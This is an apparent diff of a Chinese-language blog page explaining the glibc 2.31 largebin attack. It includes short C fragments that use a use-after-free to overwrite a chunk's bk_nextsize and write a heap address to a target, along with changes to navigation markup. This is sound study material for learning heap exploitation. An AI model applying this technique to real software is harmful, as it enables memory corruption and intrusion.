unsortedbins，之后再申请一个比 chunk1 大的 chunk3，此时由于 unsortedbins 的大小不够分配，所以从 top chunk 分配并且把 unsortedbins 中的 chunk1 放入 large bin 中</p>
 <p>初始分配时的堆情况</p>
-<p><img data-src="/images/largebin_attach/1.png" alt="" /></p>
-<p>释放chunk1的情况</p>
-<p><img data-src="/images/largebin_attach/2.png" alt="" /></p>
-<p>申请chunk3的情况</p>
-<p><img data-src="/images/largebin_attach/3.png" alt="" /></p>
-<p><img data-src="/images/largebin_attach/4.png" alt="" /></p>
-<h2 id="step2"><a class="markdownIt-Anchor" href="#step2"></a> step2</h2>
-<pre class="highlight"><code class="c"><span class="hljs-built_in">free</span>(p2);
-p1[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>)((&amp;target)<span class="hljs-number">-4</span>);
-</code></pre>
-<p>释放chunk2到unsortedbins，利用UAF漏洞覆写chunk1的bk_nextsize为目标地址-0x20</p>
-<p><img data-src="/images/largebin_attach/5.png" alt="" /></p>
-<p>可以看到，此时chunk1的bk_nextsize已经改变了</p>
-<h3 id="step3"><a class="markdownIt-Anchor" href="#step3"></a> step3</h3>
-<pre class="highlight"><code class="c"><span class="hljs-type">size_t</span> *g4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x438</span>);
-</code></pre>
-<p>此时再申请一个比chunk2大的chunk4，那么chunk2就会进入largebins，此时就触发了漏洞，把chunk2的地址写入了目标地址</p>
+<p><img data-src="/images/largebin_attach/1.png" alt=""></p>
+<p>释放 chunk1 的情况</p>
+<p><img data-src="/images/largebin_attach/2.png" alt=""></p>
+<p>申请 chunk3 的情况</p>
+<p><img data-src="/images/largebin_attach/3.png" alt=""></p>
+<p><img data-src="/images/largebin_attach/4.png" alt=""></p>
+<h2 id="step2"><a class="markdownIt-Anchor" href="#step2">#</a> step2</h2>
+<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>target<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>释放 chunk2 到 unsortedbins，利用 UAF 漏洞覆写 chunk1 的 bk_nextsize 为目标地址 - 0x20</p>
+<p><img data-src="/images/largebin_attach/5.png" alt=""></p>
+<p>可以看到，此时 chunk1 的 bk_nextsize 已经改变了</p>
+<h3 id="step3"><a class="markdownIt-Anchor" href="#step3">#</a> step3</h3>
+<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token class-name">size_t</span> <span class="token operator">*</span>g4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x438</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>此时再申请一个比 chunk2 大的 chunk4，那么 chunk2 就会进入 largebins，此时就触发了漏洞，把 chunk2 的地址写入了目标地址</p>
 <p>此时堆的状态</p>
-<p><img data-src="/images/largebin_attach/9.png" alt="" /></p>
-<p><img data-src="/images/largebin_attach/10.png" alt="" /></p>
+<p><img data-src="/images/largebin_attach/9.png" alt=""></p>
+<p><img data-src="/images/largebin_attach/10.png" alt=""></p>
 <p>得到的结果如下</p>
-<p><img data-src="/images/largebin_attach/11.png" alt="" /></p>
+<p><img data-src="/images/largebin_attach/11.png" alt=""></p>
 
       <div class="tags">
           <a href="/tags/pwn/" rel="tag"><i class="ic i-tag"></i> pwn</a>
@@ -350,7 +243,7 @@ p1[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>)
     <div class="item left">
       
 
-  <a href="/2023/03/26/2023-3-PWHHUB/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicit31ffoj20zk0m8naf.jpg" title="2023_3_PWHHUB">
+  <a href="/2023/03/26/2023-3-PWHHUB/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclize41wj20zk0m87gk.jpg" title="2023_3_PWHHUB">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>2023_3_PWHHUB</h3>
@@ -360,7 +253,7 @@ p1[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>)
     <div class="item right">
       
 
-  <a href="/2023/04/16/tcache-stashing-unlink-attack/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclfb3vzhj20zk0m8wny.jpg" title="tcache_stashing_unlink_attack">
+  <a href="/2023/04/16/tcache-stashing-unlink-attack/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclj61ylzj20zk0m8b29.jpg" title="tcache_stashing_unlink_attack">
   <span class="type">Next Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>tcache_stashing_unlink_attack</h3>
@@ -382,7 +275,7 @@ p1[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>)
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="Contents">
-          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#231%E7%89%88%E6%9C%AC%E4%B8%8B%E7%9A%84largebin-attach"><span class="toc-number">1.</span> <span class="toc-text"> 2.31版本下的largebin attach</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">1.1.</span> <span class="toc-text"> 实验代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step1"><span class="toc-number">1.2.</span> <span class="toc-text"> step1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step2"><span class="toc-number">1.3.</span> <span class="toc-text"> step2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#step3"><span class="toc-number">1.3.1.</span> <span class="toc-text"> step3</span></a></li></ol></li></ol></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#231%E7%89%88%E6%9C%AC%E4%B8%8B%E7%9A%84largebin-attach"><span class="toc-number">1.</span> <span class="toc-text"> 2.31 版本下的 largebin attach</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">1.1.</span> <span class="toc-text"> 实验代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step1"><span class="toc-number">1.2.</span> <span class="toc-text"> step1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step2"><span class="toc-number">1.3.</span> <span class="toc-text"> step2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#step3"><span class="toc-number">1.3.1.</span> <span class="toc-text"> step3</span></a></li></ol></li></ol></li></ol>
       </div>
       <div class="related panel pjax" data-title="Related">
       </div>
@@ -467,7 +360,34 @@ p1[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>)
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/08/07/Lucky-7-%E4%BA%8C%E5%85%83%E9%9D%9E%E7%BA%BF%E6%80%A7%E5%90%8C%E4%BD%99%E6%96%B9%E7%A8%8B%E7%BB%84/" title="Lucky 7 二元非线性同余方程组">Lucky 7 二元非线性同余方程组</a></span>
+    <span><a href="/2022/12/26/PWNHUB-%E5%A4%8D%E7%8E%B0/" title="PWNHUB-复现">PWNHUB-复现</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/03/i%E6%98%A5%E7%A7%8B%E5%8B%87%E8%80%85%E4%B9%8B%E5%B7%85Crypto%E5%AD%A6%E4%B9%A0/" title="i春秋勇者之巅Crypto学习">i春秋勇者之巅Crypto学习</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/03/08/SROP/" title="SROP">SROP</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/03/%E6%A0%BC%E5%AF%86%E7%A0%81/" title="格密码">格密码</a></span>
   </li>
 
       
@@ -485,7 +405,7 @@ p1[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>)
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/08/27/%E7%BD%91%E9%BC%8E%E6%9D%AFre%E3%80%81Crypto/" title="网鼎杯re、Crypto">网鼎杯re、Crypto</a></span>
+    <span><a href="/2022/09/03/Sage%E7%9A%84%E4%BD%BF%E7%94%A8/" title="Sage的使用">Sage的使用</a></span>
   </li>
 
       
@@ -494,25 +414,7 @@ p1[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>)
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/01/06/2022Nepnep%E8%B7%A8%E5%B9%B4%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0%E5%92%8C%E6%80%BB%E7%BB%93/" title="2022Nepnep跨年比赛复现和总结">2022Nepnep跨年比赛复现和总结</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/09/13/Crypto%E5%A4%8D%E7%8E%B01/" title="Crypto复现1">Crypto复现1</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/12/11/reverse%E6%B3%9B%E5%81%9A1/" title="reverse泛做1">reverse泛做1</a></span>
+    <span><a href="/2023/02/21/house-of-botcake/" title="house_of_botcake">house_of_botcake</a></span>
   </li>
 
       
@@ -530,25 +432,16 @@ p1[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>)
 <div class="breadcrumb">
 </div>
 
+    <span><a href="/2022/10/25/ciscn-pwn%E6%B3%9B%E5%81%9A/" title="ciscn_pwn泛做">ciscn_pwn泛做</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
     <span><a href="/2023/04/16/largebin-attach/" title="largebin_attach">largebin_attach</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/08/24/%E9%95%BF%E5%9F%8E%E6%9D%AFCrypto/" title="长城杯Crypto">长城杯Crypto</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/05/08/hello-world/" title="Hello World">Hello World</a></span>
   </li>
 
   </ul>
